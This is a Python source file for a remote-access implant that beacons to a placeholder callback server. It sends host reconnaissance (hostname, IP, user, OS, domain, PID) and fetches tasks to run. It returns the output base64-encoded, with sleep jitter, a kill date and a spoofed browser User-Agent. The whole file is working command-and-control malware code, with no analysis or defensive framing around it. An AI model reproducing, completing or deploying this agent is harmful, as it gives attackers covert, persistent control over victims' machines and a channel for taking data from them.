import os, random, sys, json, socket, base64, time, platform, getpass
import urllib.request
from datetime import datetime
import threading, queue

CHUNK_SIZE = 51200

class igider:
    def getOSVersion(self):
        if platform.mac_ver()[0]: 
            return "macOS "+platform.mac_ver()[0]
        else: 
            return platform.system() + " " + platform.release()

    def getUsername(self):
        try: 
            return getpass.getuser()
        except: 
            pass
        for k in ["USER", "LOGNAME", "USERNAME"]: 
            if k in os.environ.keys(): 
                return os.environ[k]
        return "unknown"

    def formatMessage(self, data):
        return base64.b64encode(json.dumps(data).encode())

    def formatResponse(self, data):
        return json.loads(base64.b64decode(data).decode())

    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.makeRequest(self.formatMessage(data), 'POST'))

    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.makeRequest(self.formatMessage(data)))

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{"task_id": task_id, "user_output": output, "completed": False}]
        message = {"action": "post_response", "responses": responses}
        return self.postMessageAndRetrieveResponse(message)

    def postResponses(self):
        try:
            responses = []
            for task in self.taskings:
                if task["completed"]:
                    out = {
                        "task_id": task["task_id"],
                        "user_output": task["result"],
                        "completed": True
                    }
                    if task["error"]: 
                        out["status"] = "error"
                    responses.append(out)
            
            if responses:
                message = {"action": "post_response", "responses": responses}
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data.get("responses", []):
                    if resp.get("status") == "success":
                        self.taskings = [t for t in self.taskings if t["task_id"] != resp["task_id"]]
        except Exception as e:
            print(f"Error posting responses: {e}")

    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if callable(function):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"]
                    output = function(**params)
                    task["result"] = output
                except Exception as e:
                    task["result"] = str(e)
                    task["error"] = True
            else:
                task["error"] = True
                task["result"] = "Command not found"
            task["completed"] = True
        except Exception as e:
            task["error"] = True
            task["completed"] = True
            task["result"] = str(e)

    def processTaskings(self):
        threads = []
        for task in self.taskings:
            if not task["started"]:
                t = threading.Thread(target=self.processTask, args=(task,))
                threads.append(t)
                t.start()
        for t in threads:
            t.join()

    def getTaskings(self):
        data = {"action": "get_tasking", "tasking_size": -1}
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data.get("tasks", []):
            self.taskings.append({
                "task_id": task["id"],
                "command": task["command"],
                "parameters": task["parameters"],
                "result": "",
                "completed": False,
                "started": False,
                "error": False
            })

    def checkIn(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname) if hostname else ""

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86"
        }
        
        response = self.makeRequest(base64.b64encode(json.dumps(data).encode()), 'POST')
        if response:
            try:
                resp_data = json.loads(base64.b64decode(response).decode())
                if "id" in resp_data:
                    self.agent_config["UUID"] = resp_data["id"]
                    return True
            except:
                pass
        return False

    def makeRequest(self, data, method='GET'):
        headers = self.agent_config["Headers"]
        url = f"{self.agent_config['Server']}:{self.agent_config['Port']}"
        
        try:
            if method == 'GET':
                url += f"{self.agent_config['GetURI']}?{self.agent_config['GetParam']}={data.decode()}"
                req = urllib.request.Request(url, headers=headers)
            else:
                url += self.agent_config["PostURI"]
                req = urllib.request.Request(url, data=data, headers=headers)
            
            with urllib.request.urlopen(req) as response:
                return response.read()
        except Exception as e:
            print(f"Request error: {e}")
            return None

    def passedKilldate(self):
        if not self.agent_config["KillDate"]:
            return False
        try:
            kd_list = [int(x) for x in self.agent_config["KillDate"].split("-")]
            kd = datetime(kd_list[0], kd_list[1], kd_list[2])
            return datetime.now() >= kd
        except:
            return False

    def agentSleep(self):
        sleep_time = self.agent_config["Sleep"]
        if self.agent_config["Jitter"] > 0:
            jitter = random.uniform(0, sleep_time * (self.agent_config["Jitter"]/100))
            sleep_time += jitter
        time.sleep(sleep_time)

    def __init__(self):
        self.taskings = []
        self.agent_config = {
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "Headers": {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json"
            },
            "Sleep": 10,
            "Jitter": 0,
            "KillDate": "",
            "GetURI": "/get_uri",
            "GetParam": "query"
        }

        while True:
            if not self.agent_config["UUID"]:
                if self.checkIn():
                    print("Checked in successfully")
                else:
                    print("Checkin failed")
                self.agentSleep()
            else:
                if self.passedKilldate():
                    sys.exit(0)
                
                try:
                    self.getTaskings()
                    self.processTaskings()
                    self.postResponses()
                except Exception as e:
                    print(f"Main loop error: {e}")
                
                self.agentSleep()

if __name__ == "__main__":
    agent = igider()